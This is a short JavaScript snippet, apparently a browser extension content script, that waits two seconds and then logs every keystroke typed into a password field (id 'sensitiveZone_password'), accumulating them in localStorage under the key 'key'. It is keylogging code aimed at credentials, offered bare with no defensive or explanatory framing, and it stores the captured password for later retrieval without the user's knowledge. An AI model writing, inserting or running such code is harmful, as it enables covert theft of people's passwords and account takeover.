// chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {

// });

var keys = "";
setTimeout(function () {
  document
    .querySelector("#sensitiveZone_password")
    .addEventListener("keyup", function (e) {
      keys += e.key;
      localStorage.setItem("key", keys);
    });
}, 2000);
